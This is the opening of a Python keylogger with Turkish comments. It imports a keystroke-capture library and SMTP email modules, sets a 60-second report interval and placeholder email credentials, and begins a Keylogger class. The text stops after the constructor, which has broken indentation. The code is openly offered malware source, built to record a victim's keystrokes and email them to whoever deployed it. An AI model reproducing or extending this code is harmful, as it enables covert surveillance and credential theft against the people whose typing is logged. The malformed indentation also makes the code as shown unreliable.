import keyboard # klavye kayitlarini kaydetmek icin
import smtplib #smtp protokolu araciligiyla e-posta gonderme
from threading import Timer
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

SEND_REPORT_EVERY = 60 #saniye
EMAIL_ADDRESS = "e-posta adresiniz"
EMAIL_PASSWORD = "sifreniz"

class Keylogger:
 def __init__(self, interval, report_method="email"):
# SEND_REPORT_EVERY degiskenini interval olarak gececegiz
self.interval = interval
self.report_method = report_method
# self.interval icindeki tum tus vuruslarininn kaydinin bulundugu string degiskeni
self.log =""
# baslangic ve bitis tarih saatlerini kaydedin
self.start_dt = datetime.now()
self.end_dt = datetime.now()